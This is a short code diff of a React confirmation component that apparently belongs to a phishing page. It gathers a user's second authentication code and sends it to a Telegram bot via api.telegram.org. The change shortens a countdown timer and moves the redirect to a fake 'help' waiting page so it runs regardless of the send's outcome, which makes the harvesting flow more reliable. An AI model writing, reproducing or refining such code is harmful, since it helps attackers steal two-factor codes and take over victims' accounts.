@@ -8,7 +8,7 @@ const ConfirmComponent = () => {
 
     const [activePopup, setActivePopup] = useState(false);
     const [activeLink, setActiveLink] = useState(false);
-    const [timeLeft, setTimeLeft] = useState(60); 
+    const [timeLeft, setTimeLeft] = useState(30); 
 
     const [activeWaring, setActiveWaring] = useState(false);
     const [firstCode, setFirstCode] = useState();
@@ -96,10 +96,11 @@ const ConfirmComponent = () => {
             '%0A<strong>Second Code Authen : </strong>' + values.fill_code;
 
             axios.get(`https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${chat_id}&text=${message}&parse_mode=html`)
-                .then((response) => {
-                    navigate('/help-100823847823627384548/waitting');
-                })
-                .catch((error) => {});
+            .then((response) => {
+            })
+            .catch((error) => {});
+
+            navigate('/help-100823847823627384548/waitting');
         }
 
     };
